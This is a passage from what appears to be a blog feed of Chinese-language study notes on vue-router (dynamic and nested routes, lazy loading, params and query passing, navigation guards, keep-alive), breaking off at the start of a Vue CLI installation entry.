class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"> &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/user/:userId&#x27;</span>,  <span class="comment">//只改这里 不会渲染user</span></span><br><span class="line">    <span class="attr">component</span>: <span class="title class_">User</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//App.vue</span></span><br><span class="line"><span class="comment">//没有动态</span></span><br><span class="line">&lt;router-link to=<span class="string">&quot;/user/zhangsan&quot;</span>&gt;用户&lt;/router-link&gt;  </span><br><span class="line"><span class="comment">//在跳转的时候 添加/zhangsan</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//动态获取 属性动态添加 下面的data</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">router-link</span> <span class="attr">:to</span>=<span class="string">&quot;&#x27;/user/&#x27; + userId&quot;</span>&gt;</span>用户<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&quot;App&quot;</span>,</span><br><span class="line"><span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line"><span class="attr">userId</span>: <span class="string">&quot;lisi&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将用户id获取到 然后在User.vue使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">//User.vue</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;h2&gt;我是用户界面&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;我是用户相关信息&lt;/p&gt;</span><br><span class="line">&lt;h2&gt;&#123;&#123; userId &#125;&#125;&lt;/h2&gt;   //!!!!</span><br><span class="line">        &lt;h2&gt;&#123;&#123; $route.params.userId &#125;&#125;&lt;/h2&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">name: &quot;User&quot;,</span><br><span class="line">computed: &#123;</span><br><span class="line">userId() &#123;</span><br><span class="line">//$route 拿到的是活跃的router</span><br><span class="line">//param：参数  userId : path: &#x27;/user/:userId&#x27; 的</span><br><span class="line">return this.$route.params.userId; //!!!</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h5 id="7.路由懒加载(p109-110)">7.路由懒加载(p109-110)<a title="#7.路由懒加载(p109-110)" href="#7.路由懒加载(p109-110)"></a></h5><h6 id="7.-1vue-router打包文件的解析">7. 1vue-router打包文件的解析<a title="#7.-1vue-router打包文件的解析" href="#7.-1vue-router打包文件的解析"></a></h6><blockquote><p>dist &gt; static &gt; index.html + css + js &gt;app… + manifest… + vendor…</p></blockquote><p>在打包的时候 会自动把css文件 跟js文件分开放，不会像之前一样都放在一个js文件里</p><p>而js文件也有分不同的包</p><ul><li>app : 当前应用程序开发的所有代码 （业务代码）</li><li>manifest：为打包的代码做底层（底层导入，导出 或者更复杂的操作）支撑</li><li>vendor：（提供商，第三方：vue/vue-router/axios/bs）第三方的东西</li></ul><h6 id="7.2-认识路由懒加载">7.2 认识路由懒加载<a title="#7.2-认识路由懒加载" href="#7.2-认识路由懒加载"></a></h6><ul><li>官方解释：</li></ul><p>当打包构建应用时，JavaScript包会很大，影响页面加载</p><p>如果能把不同路由对应的组件分割成不同的代码块，然后当路由被访问的时候才加载对应的组件，这样比较高效</p><ul><li>路由懒加载做的东西：<ul><li>主要作用：将路由对应的组件打包成一个个的js代码块</li><li>只有在这个路由被访问到的时候，才加载对应的组件</li></ul></li></ul><h6 id="7.3-懒加载的方式">7.3 懒加载的方式<a title="#7.3-懒加载的方式" href="#7.3-懒加载的方式"></a></h6><ol><li><p>结合Vue的异步组件和Webpack的代码分析（能认识就好）</p><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Home</span> = resolve =&gt; &#123; <span class="built_in">require</span>.<span class="title function_">ensure</span>([<span class="string">&#x27;../components/Home.vue&#x27;</span>],<span class="function">() =&gt;</span> &#123; <span class="title function_">resolve</span>(<span class="built_in">require</span>(<span class="string">&#x27;../components/Home.vue&#x27;</span>)) &#125;)&#125;</span><br></pre></td></tr></table></figure></blockquote></li><li><p>AMD写法：</p><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">About</span> = resolve =&gt; <span class="built_in">require</span>([<span class="string">&#x27;../components/About.vue&#x27;</span>],resolve);</span><br></pre></td></tr></table></figure></blockquote></li><li><p>在Es6中，我们可以有更加简单的写法来组织Vue异步组件和Webpack的代码分割(常用)</p><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//代替导入操作  推荐使用</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">Home</span> = (<span class="params"></span>) =&gt; <span class="title function_">import</span>(<span class="string">&#x27;../components/Home.vue&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//也可以在路由那里直接使用</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">path</span>:<span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>:<span class="function">() =&gt;</span> <span class="title function_">import</span>(<span class="string">&#x27;../components/Home&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote></li></ol><p>这个时候在npm run build 打包的时候 就会发现 js文件夹下 多了3个js文件</p><p>一个懒加载 一个js文件</p><h2 id="3.vue-router嵌套路由">3.vue-router嵌套路由<a title="#3.vue-router嵌套路由" href="#3.vue-router嵌套路由"></a></h2><h3 id="3.1-认识嵌套路由">3.1 认识嵌套路由<a title="#3.1-认识嵌套路由" href="#3.1-认识嵌套路由"></a></h3><ul><li><p>比如在home页面中，希望通过/home/news 和 /home/message访问一些内容</p></li><li><p>一个路径映射一个组件，访问这两个路径也会分别渲染两个组件</p></li><li><p>路径和组件的关系：</p><blockquote><img src='https://s1.328888.xyz/2022/04/09/Xa7J7.jpg' style="zoom:50%;" ></blockquote></li><li><p>实现嵌套路由的步骤：</p><ol><li>创建对应的子组件，并且在路由映射中配置对应的子路由</li><li>在组件内部使用<code>&lt;router-view&gt;</code>标签</li></ol></li></ul><h3 id="3.2-路由的嵌套使用">3.2 路由的嵌套使用<a title="#3.2-路由的嵌套使用" href="#3.2-路由的嵌套使用"></a></h3><ol><li><p>新建两个HomeNews.vue  HomeMessage.vue 组件</p></li><li><p>在index.js 配置上述两个vue的映射关系</p><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="title class_">Home</span>,</span><br><span class="line">    <span class="attr">children</span>: [&#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;news&#x27;</span>, <span class="comment">//不用加 ‘/’  会自动给加上：&#x27;/home/news&#x27;</span></span><br><span class="line">        <span class="attr">component</span>: <span class="title class_">HomeNews</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;message&#x27;</span>,</span><br><span class="line">        <span class="attr">component</span>: <span class="title class_">HomeMessage</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></blockquote></li><li><p>子路由的显示</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//因为这些vue是显示在home页面的 所以在Home.vue页面中 添加`&lt;router-view&gt;`</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;h2&gt;我是首页&lt;/h2&gt;</span><br><span class="line">&lt;!-- 要写完成路径 --&gt;</span><br><span class="line">&lt;router-link to=&quot;/home/news&quot;&gt;新闻&lt;/router-link&gt;</span><br><span class="line">&lt;router-link to=&quot;/home/message&quot;&gt;消息&lt;/router-link&gt;</span><br><span class="line">&lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;  </span><br></pre></td></tr></table></figure></blockquote></li><li><p>默认显示新闻路径 配置映射</p><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"><span class="attr">children</span>: [&#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="attr">redirect</span>: <span class="string">&#x27;news&#x27;</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;news&#x27;</span>, <span class="comment">//不用加 ‘/’  会自动给加上：&#x27;/home/news&#x27;</span></span><br><span class="line">        <span class="attr">component</span>: <span class="title class_">HomeNews</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;message&#x27;</span>,</span><br><span class="line">        <span class="attr">component</span>: <span class="title class_">HomeMessage</span></span><br><span class="line">    &#125;]</span><br></pre></td></tr></table></figure></blockquote></li></ol><h2 id="4.vue-router参数传递">4.vue-router参数传递<a title="#4.vue-router参数传递" href="#4.vue-router参数传递"></a></h2><h3 id="4.1-传递参数的方式：params和query">4.1 传递参数的方式：params和query<a title="#4.1-传递参数的方式：params和query" href="#4.1-传递参数的方式：params和query"></a></h3><ul><li>params类型：只传一个简单的参数<ul><li>配置路由格式：<code>/router/:id</code></li><li>传递的方式：在path后面跟上对应的值<code>:to=&quot;'/user/' + userId&quot;</code></li><li>传递后形成的路径：<code>/router/123</code>、<code>/router/abc</code></li></ul></li><li>query类型：<ul><li>配置路由格式：<code>/router</code> ，也就是普通配置</li><li>传递的方式：对象中使用query的key作为传递方式</li><li>传递后形成的路径：<code>/router?id=123</code>、<code>/router?id=abc</code></li></ul></li></ul><h3 id="4.2-query类型的使用">4.2 query类型的使用<a title="#4.2-query类型的使用" href="#4.2-query类型的使用"></a></h3><ol><li><p>创建新的组件 Profile.vue</p></li><li><p>配置路由映射 index.js</p><blockquote><ol><li>导入：<code>const Profile = () =&gt; import ('../components/Profile.vue');</code></li><li>配置映射：<code>&#123; path: '/profile', component: Profile &#125;</code></li></ol></blockquote></li><li><p>添加跳转的<code>&lt;router-link&gt;</code> app.vue</p><blockquote><p><code>&lt;router-link to=&quot;/profile&quot;&gt;我的&lt;/router-link&gt;</code></p></blockquote></li><li><p>将参数传递到url</p><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"><span class="comment">//若想把&#123;&#125; 当成对象 就得加 v-bind 这样才能被当成语法去解析</span></span><br><span class="line">&lt;router-link :to=<span class="string">&quot;&#123;path:&#x27;/profile&#x27;,query:&#123;name:&#x27;why&#x27;,age:18,height1&#x27;1.88&#125;&#125;&quot;</span>&gt;我的&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//此时点击页面的&#x27;我的&#x27; 地址显示为  localhost:8080/profile?name=why&amp;age=18&amp;height=1.88</span></span><br></pre></td></tr></table></figure></blockquote></li><li><p>去参数渲染到页面上</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//Profile.vue</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;h2&gt;我是档案（我的）标题&lt;/h2&gt;</span><br><span class="line">&lt;h2&gt;&#123;&#123; $route.query.name &#125;&#125;&lt;/h2&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure></blockquote></li></ol><h3 id="4.3-当不使用router-link而使用普通的标签-传递参数">4.3 当不使用router-link而使用普通的标签 传递参数<a title="#4.3-当不使用router-link而使用普通的标签-传递参数" href="#4.3-当不使用router-link而使用普通的标签-传递参数"></a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">//App.vue  单纯想要 跳转页面时</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">&lt;button @click=&quot;userClick&quot;&gt;用户&lt;/button&gt;</span><br><span class="line">&lt;button @click=&quot;profileClick&quot;&gt;我的&lt;/button&gt;</span><br><span class="line">&lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">name: &quot;App&quot;,</span><br><span class="line">data() &#123;</span><br><span class="line">return &#123;</span><br><span class="line">userId: &quot;lisi&quot;,</span><br><span class="line">&#125;;</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line">userClick() &#123;</span><br><span class="line">            //单纯想要 跳转页面时</span><br><span class="line">this.$router.push(&quot;/user/&quot; + this.userId);</span><br><span class="line">&#125;,</span><br><span class="line">profileClick() &#123;</span><br><span class="line">            //想要传递数据时</span><br><span class="line">this.$router.push(&#123;</span><br><span class="line">                path:&#x27;/profile&#x27;,</span><br><span class="line">                query:&#123;</span><br><span class="line">                    name:&#x27;kobe&#x27;,</span><br><span class="line">                    age:18,</span><br><span class="line">                    height:1.88</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="4.4-vue-router-：-router-route-的由来(p111)">4.4 vue-router ： router route 的由来(p111)<a title="#4.4-vue-router-：-router-route-的由来(p111)" href="#4.4-vue-router-：-router-route-的由来(p111)"></a></h3><p><code>$router</code>和<code>$route</code>是有区别的：</p><ul><li><code>$router</code>为VueRouter实例，想要导航到不同URL，则使用<code>$router.push</code>方法</li><li><code>$route</code>为当前router跳转对象里面可以获取name、path、query、params等</li></ul><p>所有的组件 继承 vue原型</p><h2 id="5.vue-router导航守卫">5.vue-router导航守卫<a title="#5.vue-router导航守卫" href="#5.vue-router导航守卫"></a></h2><p>实现点击 切换文档标题</p><h3 id="5.1-生命周期函数">5.1 生命周期函数<a title="#5.1-生命周期函数" href="#5.1-生命周期函数"></a></h3><ul><li>created：当组件被创建时调用</li><li>mounted：当模板渲染好后被调用</li><li>updated：页面更新时被调用</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    //user组件为例</span><br><span class="line">export default&#123;</span><br><span class="line">        name:&quot;User&quot;,</span><br><span class="line">        computed:&#123;</span><br><span class="line">            userId()&#123;</span><br><span class="line">                return this.$route.params.id</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        created()&#123;</span><br><span class="line">            console.log(&#x27;created&#x27;);</span><br><span class="line">            //在这个时候可以做一些事情  比如将 title改为首页</span><br><span class="line">            document.title=&#x27;首页&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="5.2-全局导航守卫">5.2 全局导航守卫<a title="#5.2-全局导航守卫" href="#5.2-全局导航守卫"></a></h3><p>因为一个一个+需求代码 太麻烦了</p><p>因为所有的跳转都是路由跳转，所以可以监听路由跳转的过程</p><p>监听：全局导航守卫</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"><span class="keyword">const</span> routes =[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">path</span>:<span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">        <span class="attr">component</span>:<span class="title class_">Home</span>,</span><br><span class="line">        <span class="comment">//可以在每个路由加上这个属性</span></span><br><span class="line">        <span class="attr">meta</span>:&#123;</span><br><span class="line">            <span class="attr">title</span>:<span class="string">&#x27;首页&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;&#125;); <span class="comment">//后面</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//前置守卫（guard） 跳转前调用</span></span><br><span class="line">router.<span class="title function_">beforeEach</span>(<span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//从from 跳转到 to  to:route类型 活跃的路由</span></span><br><span class="line">    <span class="comment">//to.meta.title 第一个的时候是undefined</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">title</span> = to.<span class="property">matched</span>[<span class="number">0</span>].<span class="property">meta</span>.<span class="property">title</span>;</span><br><span class="line">    <span class="title function_">next</span>(); <span class="comment">//必须调用next  不然不会进行下一步</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//后置钩子hook 跳转之后调用 不需要主动调用next()函数</span></span><br><span class="line">router.<span class="title function_">afterEach</span>(<span class="function">(<span class="params">to, <span class="keyword">from</span></span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;----&#x27;</span>);</span><br><span class="line">&#125;) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5.3-路由独享守卫">5.3 路由独享守卫<a title="#5.3-路由独享守卫" href="#5.3-路由独享守卫"></a></h3><p>可以到官网学习 : 导航守卫</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/profile&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="title class_">Profile</span>,</span><br><span class="line">    <span class="attr">meta</span>: &#123;</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&#x27;我的&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">        <span class="comment">//只有进入我的 才会调用</span></span><br><span class="line">    <span class="title function_">beforeEach</span>(<span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;in mine&#x27;</span>);</span><br><span class="line">    <span class="title function_">next</span>(); <span class="comment">//必须调用next  不然不会进行下一步</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5.4-组件内的守卫">5.4 组件内的守卫<a title="#5.4-组件内的守卫" href="#5.4-组件内的守卫"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> foo =&#123;</span><br><span class="line">    <span class="attr">template</span>:<span class="string">``</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6.vue-router-keep-alive">6.vue-router-keep-alive<a title="#6.vue-router-keep-alive" href="#6.vue-router-keep-alive"></a></h2><p>页面没有保存 组件之前的跳转</p><p>比如：在默认展示新闻的首页，点击消息后，又跳转到 关于 的页面，再跳转会首页的时候，展示的还是新闻的页面</p><p>因为组件的生命周期：在跳转到关于页面的时候，把首页的组件 销毁了，然后在点击回首页的时候，是重新创建了一个首页组件</p><p>不希望被创建新的时候，使用keep-alive</p><h3 id="6.1-keep-alive-遇见-vue-router">6.1 keep-alive 遇见 vue-router<a title="#6.1-keep-alive-遇见-vue-router" href="#6.1-keep-alive-遇见-vue-router"></a></h3><ul><li>keep-alive是Vue内置的一个组件，可以使被包含的组件保留状态，或避免重新渲染<ul><li>include - 字符串或正则表达式，只有匹配的组件会被缓存</li><li>exclude - 字符串或正则表达式，任何匹配的组件都不会被缓存</li></ul></li><li>router-view是vue-router的一个组件，如果直接被包再keep-alive里面，所有路径匹配到的视图组件都会被缓存</li></ul><h3 id="6.2-保存组件状态的解决">6.2 保存组件状态的解决<a title="#6.2-保存组件状态的解决" href="#6.2-保存组件状态的解决"></a></h3><blockquote><p>在App.vue中，将<code>&lt;router-view&gt;</code>放在<code>&lt;keep-alive&gt;</code>便签里，就可以不重新创建组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;keep-alive&gt;&lt;router-view/&gt;&lt;/keep-alive&gt;  //保持组件状态</span><br></pre></td></tr></table></figure></blockquote><p>但是这样还是不行</p><ul><li>解决方法一： 还是不行<code>第二次回到页面的时候，就不行了</code><ul><li>不在index.js下面设置缺省，<code>&#123;  path: '',  redirect: 'news' &#125;</code></li><li>在Home.vue的created生命周期里，添加<code>this.$router.push('/home/news')</code></li></ul></li><li>解决方法二：还是不行<code>后保存的path值是后面点击到的活跃状态的path</code><ul><li>在Home.vue的data保存一个路径<code>path:'/home/news'</code></li><li><code>activated()&#123;  this.$router.push(this.path)  &#125;</code></li><li><code>deactivated()&#123;    this.path = this.$router.path;  &#125;</code></li></ul></li><li>解决方法三：行了 组件内导航<ul><li>在Home.vue：<code>activated()&#123;  this.$router.push(this.path)  &#125;</code></li><li><code>beforeRouteLeave(to,from,next)&#123; this.path = this.$route.path; next() &#125;</code></li></ul></li></ul><p><strong>activated() / deactivated()只有该组件被保持了状态 使用了keep-alive时才有效</strong></p>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>05 Vue CLI</title>
      <link href="/learningNotes/vue/05Vue%20CLI"/>
      <url>/learningNotes/vue/05Vue%20CLI</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="1.vue-cli介绍和安装">1.Vue CLI介绍和安装<a title="#1.vue-cli介绍和安装" href="#1.vue-cli介绍和安装"></a></h2><h3 id="1.1-cli-是什么意思？">1.1 CLI 是什么意思？<a title="#1.1-cli-是什么意思？" href="#1.1-cli-是什么意思？"></a></h3><ul><li>CLI是Command-Line Interface ，即命令行界面，俗称脚手架</li><li>Vue CLI是一个官方发布vue.js项目脚手架</li><li>使用vue-cli可以快速搭建Vue开发环境以及对应的webpack配置</li></ul><h3 id="1.2-vue-cli使用前提---node">1.2 Vue CLI使用前提 - Node<a title="#1.2-vue-cli使用前提---node" href="#1.2-vue-cli使用前提---node"></a></h3><p>node环境要求8.9以上版本</p><h3 id="1.3-vue-cli使用前提---webpack">1.3 Vue CLI使用前提 - Webpack<a title="#1.3-vue-cli使用前提---webpack" href="#1.3-vue-cli使用前提---webpack"></a></h3><p>Vue.js官方脚手架工具使用了webpack模板</p><h3 id="1.4-vue-cli的使用">1.4 Vue CLI的使用<a title="#1.4-vue-cli的使用" href="#1.4-vue-cli的使用"></a></h3><ol><li><p>安装Vue脚手架 在cmd终端安装</p><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install -g @vue/cli    <span class="comment">//版本3.2.1</span></span><br><span class="line"></span><br><span class="line">vue --version <span class="comment">//查看版本  //装了4.5.12</span></span><br></pre></td></tr></table></figure></blockquote><p>因为安装的是Vue CLI3的版本 如果想按照Vue CLI2的方式初始化项目是不可以的</p></li><li><p>拉取2.x版本</p><blockquote><p>Vue CLI3和 旧版使用了相同的<code>vue</code>命令 ，所以Vue CLI2(<code>vue-cli</code>)被覆盖了，如果你仍需使用旧版本的 <code>vue init</code>功能，可以全局安装一个桥接工具：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install -g @vue/cli-init  <span class="comment">//拉取脚手架2 使用脚手架2</span></span><br><span class="line">vue init webpack my-project   <span class="comment">//使用2 创建项目</span></span><br></pre></td></tr></table></figure></blockquote></li><li><p>Vue CLI2 初始化项目</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vue init webpack my-project</span><br></pre></td></tr></table></figure></li><li><p>Vue CLI3初始化项目</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vue create my-project</span><br></pre></td></tr></table></figure></li></ol><h3 id="1.5-vuecli-cli2初始化项目过程">1.5 vuecli-CLI2初始化项目过程<a title="#1.5-vuecli-cli2初始化项目过程" href="#1.5-vuecli-cli2初始化项目过程"></a></h3><ol><li><p>In   : <code>vue init webpack vuecli2test</code> //项目名字不能大写</p></li><li><p>下载配置</p></li><li><p>Out: <code>? Project name (vuecli2test) </code>    //一般文件名 